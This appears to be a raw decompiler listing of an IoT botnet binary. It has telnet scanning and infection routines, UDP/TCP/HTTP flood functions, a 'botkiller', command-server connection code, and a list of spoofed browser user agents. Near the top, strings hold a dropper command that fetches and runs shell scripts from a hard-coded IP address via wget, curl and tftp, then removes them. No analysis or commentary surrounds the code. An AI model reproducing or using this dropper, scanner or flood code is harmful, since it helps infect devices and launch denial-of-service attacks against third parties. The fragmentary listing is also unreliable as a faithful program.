+++++++++ FUNCTION LENGTH 751
+        "wget",
+        "/dev/netslink/",
+        "accept"
+    char (*v33)[7] = "accept";
+        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
+        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
+        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
+        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
+        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
+        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
+        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
+        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
+        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
+        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
+        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
+        "etrbhhgetrb",
+        "http",
+        "Unknown host",
+        "Host name lookup failure",
+        "etrbhhgetrb",
+        "http",
+        "Unknown host",
+        "Host name lookup failure",
+        "Unknown host",
+        "Host name lookup failure",
+        "telnet",
+        "telnet",
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+        "telnet",
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+    char (*v50)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
+=================FUNCTION : main ===================
+++++++++ FUNCTION START 48141
+++++++++ FUNCTION END 49019
+++++++++ FUNCTION LENGTH 878
+    if (geteuid() == 0) {
+    getBuild();
+    getBuild();
+    __GI_inet_ntoa(*(int32_t *)&v489);
+    printf((char *)&format);
+    sprintf(*(int32_t *)argv, (int32_t)&v492);
+    int32_t v494 = v493 ^ __libc_getpid(); // 0x4110f4
+    srand(v494);
+    int32_t v496 = v495 ^ __libc_getpid(); // 0x411140
+    init_rand(v496);
+    getOurIP();
+    int32_t v497 = __libc_fork(); // 0x411180
+        if (__libc_fork() != 0) {
+        if (initConnection() != 0) {
+        __GI_inet_ntoa(*(int32_t *)&v489);
+        getBuild();
+        HackerPrint(*(int32_t *)&v499, (int32_t)&v498);
+        while (true) {
+            while (true) {
+                    while (true) {
+                    if (strstr(v505, (char *)(*(int32_t *)&v515 - 0x29a4)) == v505) {
+                        HackerPrint(*(int32_t *)&v499, (int32_t)&v516);
+                    if (strstr(v505, (char *)&v517) == v505) {
+                        while (true) {
+                                while (true) {
+                        while (true) {
+                                if (listFork() == 0) {
+                                    szprintf(v506, (int32_t)&v537, v530);
+                                    fdpopen(v506, (char *)&v538);
+                                    while (fdgets(v506, 1024, v506) != 0) {
+                                    fdpclose(v506);
+                                    while (true) {
+                                    processCmd(v539, &v533);
+                                        free();
+                                            free();
+        __libc_waitpid(v497, (int32_t)&v547, 0);
+    if (initConnection() != 0) {
+    __GI_inet_ntoa(*(int32_t *)&v489);
+    getBuild();
+    HackerPrint(*(int32_t *)&v499, (int32_t)&v498);
+    while (true) {
+    while (true) {
+    free();
+=================FUNCTION : _vfprintf_internal ===================
+++++++++ FUNCTION START 69351
+++++++++ FUNCTION END 78011
+++++++++ FUNCTION LENGTH 8660
+        while (true) {
+                case 37: {
+                        while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                                        while (true) {
+                                                    while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                while (true) {
+                                                            while (true) {
+                                                                while (true) {
+                                                            while (true) {
+                                                                    while (true) {
+                case 0: {
+                            while (true) {
+    while (true) {
+            case 37: {
+                        while (true) {
+            case 0: {
+                        while (true) {
+=================FUNCTION : __dns_lookup ===================
+++++++++ FUNCTION START 139121
+++++++++ FUNCTION END 140150
+++++++++ FUNCTION LENGTH 1029
+            __libc_close(v502);
+        free();
+        free();
+        while (true) {
+                    if (inet_pton(10, (char *)v526, (int32_t)&v525) < 1) {
+                    inet_addr(v526);
+                    int32_t v527 = socket(); // 0x419668
+                    if (__libc_connect(v527, (struct sockaddr *)28, 28) > -1) {
+                        __libc_send(v527, (int32_t *)v494, 0, 0);
+                            int32_t v534 = __libc_recv(v527, (int32_t *)v494, 512, 0, (int32_t)&v533); // 0x41973c
+                                            case 3: {
+                                            case 0: {
+                                                while (true) {
+                                                while (true) {
+                                                                            free();
+                                                                            free();
+                                                                        free();
+                                                                            free();
+                                                                            case 28: {
+                                                                            case 1: {
+                                                    __libc_close(v502);
+                                                free();
+                                                free();
+                __libc_close(v502);
+            free();
+            free();
+        __libc_close(v502);
+    free();
+    free();
+=================FUNCTION : fdpopen ===================
+++++++++ FUNCTION START 8206
+++++++++ FUNCTION END 8938
+++++++++ FUNCTION LENGTH 732
+            v506 = 4 * getdtablesize();
+        v507 = __vfork();
+            __libc_close(v504);
+            __libc_close(v505);
+                    __libc_close(v505);
+                __libc_close(v504);
+            __libc_close(v504);
+            __libc_close(v505);
+                __libc_close(v505);
+            __libc_close(v504);
+            v506 = 4 * getdtablesize();
+        v507 = __vfork();
+            __libc_close(v504);
+            __libc_close(v505);
+                __libc_close(v504);
+                __libc_close(v505);
+                __libc_close(v505);
+            __libc_close(v504);
+        v506 = 4 * getdtablesize();
+    v507 = __vfork();
+        __libc_close(v504);
+        __libc_close(v505);
+            __libc_close(v504);
+            __libc_close(v505);
+            __libc_close(v505);
+        __libc_close(v504);
+=================FUNCTION : sendUDP ===================
+++++++++ FUNCTION START 40728
+++++++++ FUNCTION END 41362
+++++++++ FUNCTION LENGTH 634
+        rand_cmwc();
+    int32_t v506 = getHost(a1, &v505); // 0x40c318
+            int32_t v509 = socket(); // 0x40c384
+                HackerPrint(*(int32_t *)&v508, (int32_t)&v510);
+            makeRandomStr(v512, a5);
+            __libc_sendto(v509, v513, a5, 0, (int32_t)&v503, 16);
+                    rand_cmwc();
+        if (__GI_setsockopt(v502, 0, 3, &v517, 4) <= 0xffffffff) {
+            HackerPrint(*(int32_t *)&v508, (int32_t)&v518);
+            int32_t v521 = v519 ^ rand_cmwc(); // 0x40c698
+            srand(v521);
+            init_rand(rand());
+        *v525 = (int16_t)rand_cmwc();
+            rand_cmwc();
+        makeRandomStr(v524 + 28, a5);
+        __libc_sendto(v502, (int32_t *)v524, a5 + 28, 0, v533, (int32_t)&v534);
+        *v525 = (int16_t)rand_cmwc();
+            rand_cmwc();
+        rand_cmwc();
+=================FUNCTION : StartTheLelz ===================
+++++++++ FUNCTION START 36269
+++++++++ FUNCTION END 37050
+++++++++ FUNCTION LENGTH 781
+    int32_t v502 = v501 ^ rand_cmwc(); // 0x409b64
+    srand(v502);
+    while (true) {
+            socket();
+                if (__libc_connect(*v523, (struct sockaddr *)&v503, 16) == -1) {
+                        sclose(*v523);
+                while (true) {
+                            sclose(*v523);
+                                if (__libc_send(*v523, (int32_t *)v533, v532, 0x4000) <= 0xffffffff) {
+                                if (__libc_send(*v523, (int32_t *)(v535 - 0x1d78), 2, 0x4000) <= 0xffffffff) {
+                                    if (__libc_send(*v523, (int32_t *)v537, v536, 0x4000) <= 0xffffffff) {
+                                    if (__libc_send(*v523, (int32_t *)(v538 - 0x1d78), 2, 0x4000) <= 0xffffffff) {
+                                            get_telstate_host(v510);
+                                            HackerPrint(*(int32_t *)&v539, *(int32_t *)&v534 - 0x1d74);
+                                            get_telstate_host(v510);
+                                            HackerPrint(*(int32_t *)&v539, *(int32_t *)&v534 - 0x1d08);
+                                        if (__libc_send(*v523, (int32_t *)v544, v542, 0x4000) <= 0xffffffff) {
+                                            sclose(*v523);
+=================FUNCTION : sendTCP ===================
+++++++++ FUNCTION START 41893
+++++++++ FUNCTION END 42527
+++++++++ FUNCTION LENGTH 634
+        rand_cmwc();
+    getHost(a1, &v495);
+    socket();
+    if (__GI_setsockopt(v497, 0, 3, &v498, 4) <= 0xffffffff) {
+        HackerPrint(*(int32_t *)&v499, (int32_t)&v500);
+    *v505 = (int16_t)rand_cmwc();
+    int32_t v507 = rand_cmwc(); // 0x40d04c
+    while (true) {
+        HackerPrint(*(int32_t *)&v499, (int32_t)&v519);
+    rand_cmwc();
+        rand_cmwc();
+    *v521 = (int16_t)tcpcsum(v503, v504);
+    __libc_sendto(v497, (int32_t *)v503, a6 + 40, 0, v526, (int32_t)&v527);
+    rand_cmwc();
+    *v508 = rand_cmwc();
+    *v505 = (int16_t)rand_cmwc();
+    *v521 = (int16_t)tcpcsum(v503, v504);
+=================FUNCTION : fdpclose ===================
+++++++++ FUNCTION START 8941
+++++++++ FUNCTION END 9536
+++++++++ FUNCTION LENGTH 595
+            __libc_close(a1);
+            sigprocmask();
+            while (true) {
+                int32_t v509 = __libc_waitpid(v507, (int32_t)&v505, 0); // 0x401b50
+                sigprocmask();
+        __libc_close(a1);
+        sigprocmask();
+        while (true) {
+            if (__libc_waitpid(v507, (int32_t)&v505, 0) == -1) {
+            sigprocmask();
+    __libc_close(a1);
+    sigprocmask();
+    while (true) {
+        if (__libc_waitpid(v507, (int32_t)&v505, 0) == -1) {
+        sigprocmask();
+=================FUNCTION : RemoveTMP ===================
+++++++++ FUNCTION START 38611
+++++++++ FUNCTION END 39129
+++++++++ FUNCTION LENGTH 518
+    __libc_system(*(int32_t *)&v503 - 0x1870);
+    __libc_system(*(int32_t *)&v503 - 0x1844);
+    __libc_system(*(int32_t *)&v503 - 0x182c);
+    __libc_system(*(int32_t *)&v503 - 0x1844);
+    __libc_system(*(int32_t *)&v503 - 0x1814);
+    __libc_system(*(int32_t *)&v503 - 0x1804);
+    __libc_system(*(int32_t *)&v503 - 0x17f8);
+    __libc_system(*(int32_t *)&v503 - 0x17e0);
+    __libc_system(*(int32_t *)&v503 - 0x17cc);
+    __libc_system(*(int32_t *)&v503 - 0x17c0);
+    __libc_system(*(int32_t *)&v503 - 0x17ac);
+    __libc_system(*(int32_t *)&v503 - 0x179c);
+    return __libc_system(*(int32_t *)&v503 - 0x1784);
+=================FUNCTION : getOurIP ===================
+++++++++ FUNCTION START 47068
+++++++++ FUNCTION END 47628
+++++++++ FUNCTION LENGTH 560
+    int32_t v501 = socket(); // 0x410ae0
+    inet_addr((int32_t)&v503);
+    __libc_connect(v501, (struct sockaddr *)&v502, 16);
+    __GI_getsockname(v501, (struct sockaddr *)&v505, (int32_t)&v504);
+    int32_t v507 = __libc_open((char *)&v506, 0); // 0x410c34
+    while (true) {
+        if (strstr(v509, (char *)&v510) != 0) {
+        if (fdgets(v509, 0x1000, v507) == 0) {
+    __libc_close(v507);
+        __libc_close(v501);
+    __libc_close(v501);
+=================FUNCTION : _fpmaxtostr ===================
+++++++++ FUNCTION START 133366
+++++++++ FUNCTION END 134893
+++++++++ FUNCTION LENGTH 1527
+    while (true) {
+    while (true) {
+        while (true) {
+                    while (true) {
+                        while (true) {
+                                            while (true) {
+                                                while (true) {
+                                        while (true) {
+                                while (true) {
+                                        while (true) {
+                            while (true) {
+=================FUNCTION : sendJUNK ===================
+++++++++ FUNCTION START 42530
+++++++++ FUNCTION END 43190
+++++++++ FUNCTION LENGTH 660
+    int32_t v504 = getdtablesize(); // 0x40d710
+    getHost(a1, &v507);
+    while (true) {
+        while (true) {
+                while (true) {
+                    if (__libc_send(*v529, v511, 1024, 0x4000) != -1) {
+                    __libc_close(*v529);
+                    if (__libc_connect(*v532, (struct sockaddr *)&v506, 16) == -1) {
+                            __libc_close(*v532);
+                        __libc_close(*v532);
+=================FUNCTION : __read_etc_hosts_r ===================
+++++++++ FUNCTION START 158441
+++++++++ FUNCTION END 159304
+++++++++ FUNCTION LENGTH 863
+                                        v507 = __open_etc_hosts();
+            while (true) {
+                while (true) {
+                    while (true) {
+                            while (true) {
+                                        if (inet_pton(2, (char *)v536, 0) > 0) {
+                                        while (true) {
+                                        __GI_fclose((int16_t *)a1);
+                                v507 = __open_etc_hosts();
+=================FUNCTION : getBogos ===================
+++++++++ FUNCTION START 12303
+++++++++ FUNCTION END 12899
+++++++++ FUNCTION LENGTH 596
+    int32_t v504 = __libc_open((char *)(*(int32_t *)&v503 - 0x29c0), 0); // 0x402234
+    while (true) {
+        uppercase((char *)&v505);
+        if (strstr(v506, (char *)(*(int32_t *)&v503 - 0x29b0)) == v506) {
+            while (true) {
+        if (fdgets(v506, 0x1000, v504) == 0) {
+    __libc_close(v504);
+    while (true) {
+    __libc_close(v504);
+=================FUNCTION : sendHOLD ===================
+++++++++ FUNCTION START 43193
+++++++++ FUNCTION END 43846
+++++++++ FUNCTION LENGTH 653
+    int32_t v504 = getdtablesize(); // 0x40de44
+    getHost(a1, &v507);
+    while (true) {
+        while (true) {
+                    while (true) {
+                            __libc_close(*v528);
+                    if (__libc_connect(*v532, (struct sockaddr *)&v506, 16) == -1) {
+                            __libc_close(*v532);
+                        __libc_close(*v532);
+=================FUNCTION : __open_nameservers ===================
+++++++++ FUNCTION START 140153
+++++++++ FUNCTION END 140864
+++++++++ FUNCTION LENGTH 711
+    int32_t v499 = __GI_fopen((int32_t)&v497, (int32_t)&v498); // 0x419d8c
+        int32_t v506 = __GI_fopen((int32_t)&v505, (int32_t)&v498); // 0x419dac
+            while (true) {
+                __GI_fclose((int16_t *)v501);
+            while (true) {
+                while (true) {
+                        while (true) {
+                        while (true) {
+    __GI_fclose((int16_t *)v501);
+=================FUNCTION : getCores ===================
+++++++++ FUNCTION START 12902
+++++++++ FUNCTION END 13426
+++++++++ FUNCTION LENGTH 524
+    int32_t v504 = __libc_open((char *)(*(int32_t *)&v503 - 0x29c0), 0); // 0x402538
+    uppercase((char *)&v505);
+    int32_t result = strstr(v506, (char *)(v507 - 0x29b0)) == v506;
+    while (fdgets(v506, 0x1000, v504) != 0) {
+        uppercase((char *)&v505);
+        result += (int32_t)(strstr(v506, (char *)(v507 - 0x29b0)) == v506);
+    __libc_close(v504);
+=================FUNCTION : sendCNC ===================
+++++++++ FUNCTION START 41365
+++++++++ FUNCTION END 41890
+++++++++ FUNCTION LENGTH 525
+    inet_addr(a1);
+    int32_t v506 = socket(); // 0x40cc60
+    __libc_connect(v506, (struct sockaddr *)&v505, 16);
+    __libc_close(v506);
+        v506 = socket();
+        __libc_connect(v506, (struct sockaddr *)&v505, 16);
+        __libc_close(v506);
+=================FUNCTION : HackerScan2 ===================
+++++++++ FUNCTION START 17887
+++++++++ FUNCTION END 30045
+++++++++ FUNCTION LENGTH 12158
+    int32_t v503 = rand(); // 0x403a08
+    int32_t v504 = rand(); // 0x403a80
+    int32_t v505 = rand(); // 0x403af8
+    int32_t v506 = rand(); // 0x403b70
+    int32_t v507 = rand(); // 0x403be8
+        szprintf((int32_t)&v510, v511 - 0x2984, (int32_t)v501);
+            szprintf((int32_t)&v510, v512 - 0x2978, (int32_t)v501);
+=================FUNCTION : sendHTTP ===================
+++++++++ FUNCTION START 39651
+++++++++ FUNCTION END 40203
+++++++++ FUNCTION LENGTH 552
+    rand();
+    rand();
+    int32_t v507 = sprintf(v505, (int32_t)&v506); // v0
+    while (true) {
+            while (true) {
+                int32_t v511 = socket_connect(a1, a3); // 0x40becc
+                    __libc_close(v512);
+=================FUNCTION : _ppfs_parsespec ===================
+++++++++ FUNCTION START 80293
+++++++++ FUNCTION END 81627
+++++++++ FUNCTION LENGTH 1334
+    while (true) {
+            while (true) {
+                while (true) {
+                                while (true) {
+                                        while (true) {
+                                        while (true) {
+=================FUNCTION : __GI_memmove ===================
+++++++++ FUNCTION START 135500
+++++++++ FUNCTION END 136318
+++++++++ FUNCTION LENGTH 818
+                    case -2: {
+                    case -1: {
+                        while (true) {
+                case -2: {
+                case -1: {
+                    while (true) {
+=================FUNCTION : NetisRanges ===================
+++++++++ FUNCTION START 30048
+++++++++ FUNCTION END 30562
+++++++++ FUNCTION LENGTH 514
+    rand();
+    int32_t v500 = rand(); // 0x408ed0
+    int32_t v502 = rand(); // 0x408f48
+    int32_t v504 = rand(); // 0x408fc0
+    szprintf(v507, *(int32_t *)&v508 - 0x1d84, (int32_t)v509);
+    return inet_addr(v507);
+=================FUNCTION : readUntil ===================
+++++++++ FUNCTION START 17286
+++++++++ FUNCTION END 17884
+++++++++ FUNCTION LENGTH 598
+    while (true) {
+        while (true) {
+                int32_t v513 = __libc_recv(a1, (int32_t *)v512, 1, 0, v512) + a8; // 0x4037f4
+                    int32_t v516 = __libc_recv(a1, (int32_t *)(v512 + 1), 2, 0, v513) + v513; // 0x403880
+                if (strstr(a6, (char *)a2) == 0) {
+=================FUNCTION : __uClibc_main ===================
+++++++++ FUNCTION START 121132
+++++++++ FUNCTION END 121976
+++++++++ FUNCTION LENGTH 844
+    while (true) {
+    int32_t v532 = getuid(); // 0x4173d8
+    if (v532 == geteuid()) {
+        int32_t v533 = getgid(); // 0x41740c
+        if (v533 == getegid()) {
+=================FUNCTION : __GI_inet_ntop ===================
+++++++++ FUNCTION START 154454
+++++++++ FUNCTION END 155308
+++++++++ FUNCTION LENGTH 854
+            while (true) {
+                    while (true) {
+                    while (true) {
+            while (true) {
+    while (true) {
+=================FUNCTION : botkiller ===================
+++++++++ FUNCTION START 38081
+++++++++ FUNCTION END 38608
+++++++++ FUNCTION LENGTH 527
+        __GI_snprintf(v505, 127, *(int32_t *)&v506 - 0x1904, v507, v507, v507);
+        __GI_snprintf(v505, 127, *(int32_t *)&v506 - 0x18a0, v508, v508, v508);
+        __libc_system(v505);
+        sprintf(v510, *(int32_t *)&v506 - 0x1880);
+        __libc_system(v510);
+=================FUNCTION : recvLine ===================
+++++++++ FUNCTION START 13949
+++++++++ FUNCTION END 14550
+++++++++ FUNCTION LENGTH 601
+        while (true) {
+            HackerPrint(*(int32_t *)&v512, *(int32_t *)&v511 - 0x29a4);
+            while (true) {
+            while (true) {
+    while (true) {
+=================FUNCTION : StartTheNetis ===================
+++++++++ FUNCTION START 37053
+++++++++ FUNCTION END 37568
+++++++++ FUNCTION LENGTH 515
+    int32_t v503 = socket(); // 0x40b45c
+    NetisRanges();
+    sprintf(v507, *(int32_t *)&v508 - 0x1cd8);
+    return __libc_sendto(v503, &v506, v507, 0, (int32_t)&v504, 16);
+=================FUNCTION : connectTimeout ===================
+++++++++ FUNCTION START 15076
+++++++++ FUNCTION END 15631
+++++++++ FUNCTION LENGTH 555
+    getHost(a2, &v505);
+    __libc_connect(a1, (struct sockaddr *)&v504, 16);
+        while (true) {
+                    getsockopt();
+=================FUNCTION : socket_connect ===================
+++++++++ FUNCTION START 39132
+++++++++ FUNCTION END 39648
+++++++++ FUNCTION LENGTH 516
+    __GI_gethostbyname(a1);
+    int32_t result = socket(); // 0x40bbf0
+    __GI_setsockopt(result, 6, 1, &v504, 4);
+    __libc_connect(result, (struct sockaddr *)&v508, 16);
+=================FUNCTION : _load_inttype ===================
+++++++++ FUNCTION START 131670
+++++++++ FUNCTION END 132219
+++++++++ FUNCTION LENGTH 549
+                case 256: {
+                case 512: {
+                case 256: {
+                case 512: {
+=================FUNCTION : inet_pton ===================
+++++++++ FUNCTION START 153102
+++++++++ FUNCTION END 153893
+++++++++ FUNCTION LENGTH 791
+                    while (true) {
+            while (true) {
+            while (true) {
+    while (true) {
+=================FUNCTION : strstr ===================
+++++++++ FUNCTION START 87560
+++++++++ FUNCTION END 88194
+++++++++ FUNCTION LENGTH 634
+    while (true) {
+    while (true) {
+        while (true) {
+=================FUNCTION : sleep ===================
+++++++++ FUNCTION START 117936
+++++++++ FUNCTION END 118524
+++++++++ FUNCTION LENGTH 588
+    if (sigprocmask() == 0) {
+                    sigprocmask();
+                    sigprocmask();
+=================FUNCTION : sendSTD ===================
+++++++++ FUNCTION START 40206
+++++++++ FUNCTION END 40725
+++++++++ FUNCTION LENGTH 519
+    socket();
+    __GI_gethostbyname(a1);
+    rand();
+=================FUNCTION : strnlen ===================
+++++++++ FUNCTION START 86955
+++++++++ FUNCTION END 87557
+++++++++ FUNCTION LENGTH 602
+    while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : __GI_memchr ===================
+++++++++ FUNCTION START 134896
+++++++++ FUNCTION END 135497
+++++++++ FUNCTION LENGTH 601
+    while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : listFork ===================
+++++++++ FUNCTION START 15634
+++++++++ FUNCTION END 16167
+++++++++ FUNCTION LENGTH 533
+    int32_t result = __libc_fork(); // 0x402f98
+    while (true) {
+    free();
+=================FUNCTION : negotiate ===================
+++++++++ FUNCTION START 16170
+++++++++ FUNCTION END 16716
+++++++++ FUNCTION LENGTH 546
+    __libc_send(a1, (int32_t *)&v506, 1, 0x4000);
+    __libc_send(a1, (int32_t *)&v506, 1, 0x4000);
+    __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
+=================FUNCTION : __GI_herror ===================
+++++++++ FUNCTION START 94942
+++++++++ FUNCTION END 95500
+++++++++ FUNCTION LENGTH 558
+        return fprintf(v508, (int32_t)&v501, v499, v505, v504);
+        return fprintf(v508, (int32_t)&v501, v499, v505, v504);
+    return fprintf(v508, (int32_t)&v501, v499, v505, v504);
+=================FUNCTION : initConnection ===================
+++++++++ FUNCTION START 46522
+++++++++ FUNCTION END 47065
+++++++++ FUNCTION LENGTH 543
+        __libc_close(v504);
+    socket();
+    if (connectTimeout(*(int32_t *)&v503, v502, v508, 30) == 0) {
+=================FUNCTION : memrchr ===================
+++++++++ FUNCTION START 136831
+++++++++ FUNCTION END 137429
+++++++++ FUNCTION LENGTH 598
+    while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : srandom_r ===================
+++++++++ FUNCTION START 112902
+++++++++ FUNCTION END 113462
+++++++++ FUNCTION LENGTH 560
+    while (true) {
+            __GI_random_r((int32_t *)(8 * v514), v510);
+                __GI_random_r((int32_t *)a2, (int32_t)&v516);
+=================FUNCTION : print ===================
+++++++++ FUNCTION START 5965
+++++++++ FUNCTION END 6669
+++++++++ FUNCTION LENGTH 704
+    while (true) {
+                        while (true) {
+=================FUNCTION : _stdio_term ===================
+++++++++ FUNCTION START 66632
+++++++++ FUNCTION END 67185
+++++++++ FUNCTION LENGTH 553
+    while (true) {
+    while (true) {
+=================FUNCTION : inet_aton ===================
+++++++++ FUNCTION START 138522
+++++++++ FUNCTION END 139118
+++++++++ FUNCTION LENGTH 596
+    while (true) {
+        while (true) {
+=================FUNCTION : _store_inttype ===================
+++++++++ FUNCTION START 132222
+++++++++ FUNCTION END 132750
+++++++++ FUNCTION LENGTH 528
+        case 256: {
+        case 2048: {
+=================FUNCTION : HackerPrint ===================
+++++++++ FUNCTION START 7692
+++++++++ FUNCTION END 8203
+++++++++ FUNCTION LENGTH 511
+    int32_t result = __libc_send(a1, v503, __GI_strlen(), 0x4000); // 0x40151c
+    free();
+=================FUNCTION : __GI_initstate_r ===================
+++++++++ FUNCTION START 113465
+++++++++ FUNCTION END 114008
+++++++++ FUNCTION LENGTH 543
+        srandom_r((int64_t)a1, a4);
+    srandom_r((int64_t)a1, a4);
+=================FUNCTION : makeRandomStr ===================
+++++++++ FUNCTION START 13429
+++++++++ FUNCTION END 13946
+++++++++ FUNCTION LENGTH 517
+    rand_cmwc();
+        rand_cmwc();
+=================FUNCTION : _stdlib_strto_l ===================
+++++++++ FUNCTION START 115577
+++++++++ FUNCTION END 116865
+++++++++ FUNCTION LENGTH 1288
+        case 43: {
+        case 45: {
+=================FUNCTION : __GI_fclose ===================
+++++++++ FUNCTION START 143609
+++++++++ FUNCTION END 144170
+++++++++ FUNCTION LENGTH 561
+        free();
+    _stdio_openlist_dec_use();
+=================FUNCTION : __GI_strncat ===================
+++++++++ FUNCTION START 150842
+++++++++ FUNCTION END 151434
+++++++++ FUNCTION LENGTH 592
+    while (true) {
+            while (true) {
+=================FUNCTION : __length_dotted ===================
+++++++++ FUNCTION START 163245
+++++++++ FUNCTION END 163788
+++++++++ FUNCTION LENGTH 543
+    while (true) {
+        while (true) {
+=================FUNCTION : read_with_timeout ===================
+++++++++ FUNCTION START 34190
+++++++++ FUNCTION END 34714
+++++++++ FUNCTION LENGTH 524
+    while (true) {
+            return __libc_recv(a1, (int32_t *)a3, a4, 0, (int32_t)&v511);
+=================FUNCTION : _stdio_openlist_dec_use ===================
+++++++++ FUNCTION START 148522
+++++++++ FUNCTION END 149087
+++++++++ FUNCTION LENGTH 565
+        while (true) {
+                free();
+=================FUNCTION : strncpy ===================
+++++++++ FUNCTION START 86358
+++++++++ FUNCTION END 86952
+++++++++ FUNCTION LENGTH 594
+                            while (true) {
+    while (true) {
+=================FUNCTION : __libc_recv ===================
+++++++++ FUNCTION START 100110
+++++++++ FUNCTION END 100626
+++++++++ FUNCTION LENGTH 516
+    int32_t v504 = recv(sock, buf, length, flags); // 0x4155f0
+    if (flags != 0) {
+=================FUNCTION : hostname_to_ip ===================
+++++++++ FUNCTION START 14553
+++++++++ FUNCTION END 15073
+++++++++ FUNCTION LENGTH 520
+    if (__GI_gethostbyname(a1) == 0) {
+        strcpy(a2, (char *)__GI_inet_ntoa(v505));
+=================FUNCTION : __raise ===================
+++++++++ FUNCTION START 159307
+++++++++ FUNCTION END 159814
+++++++++ FUNCTION LENGTH 507
+    __libc_getpid();
+    return kill();
+=================FUNCTION : __GI_strpbrk ===================
+++++++++ FUNCTION START 137963
+++++++++ FUNCTION END 138519
+++++++++ FUNCTION LENGTH 556
+    while (true) {
+        while (true) {
+=================FUNCTION : printi ===================
+++++++++ FUNCTION START 5366
+++++++++ FUNCTION END 5962
+++++++++ FUNCTION LENGTH 596
+            while (true) {
+    while (true) {
+=================FUNCTION : __libc_system ===================
+++++++++ FUNCTION START 114011
+++++++++ FUNCTION END 114556
+++++++++ FUNCTION LENGTH 545
+    int32_t v503 = __libc_fork(); // 0x41685c
+    if (wait4() == -1) {
+=================FUNCTION : __xpg_strerror_r ===================
+++++++++ FUNCTION START 88707
+++++++++ FUNCTION END 89290
+++++++++ FUNCTION LENGTH 583
+    while (true) {
+        while (true) {
+=================FUNCTION : __libc_sendto ===================
+++++++++ FUNCTION START 101148
+++++++++ FUNCTION END 101664
+++++++++ FUNCTION LENGTH 516
+    int32_t v504 = sendto(sock, message, length, flags, NULL, 0); // 0x4156d0
+    if (flags != 0) {
+=================FUNCTION : _uintmaxtostr ===================
+++++++++ FUNCTION START 132753
+++++++++ FUNCTION END 133363
+++++++++ FUNCTION LENGTH 610
+        while (true) {
+    while (true) {
+=================FUNCTION : _ppfs_init ===================
+++++++++ FUNCTION START 78014
+++++++++ FUNCTION END 78592
+++++++++ FUNCTION LENGTH 578
+        while (true) {
+    while (true) {
+=================FUNCTION : __GI_strchr ===================
+++++++++ FUNCTION START 84130
+++++++++ FUNCTION END 84729
+++++++++ FUNCTION LENGTH 599
+    while (true) {
+    while (true) {
+=================FUNCTION : __GI_fgets_unlocked ===================
+++++++++ FUNCTION START 149692
+++++++++ FUNCTION END 150263
+++++++++ FUNCTION LENGTH 571
+    while (true) {
+        int32_t v509 = 0x1000000 * getc_unlocked();
+=================FUNCTION : rawmemchr ===================
+++++++++ FUNCTION START 150266
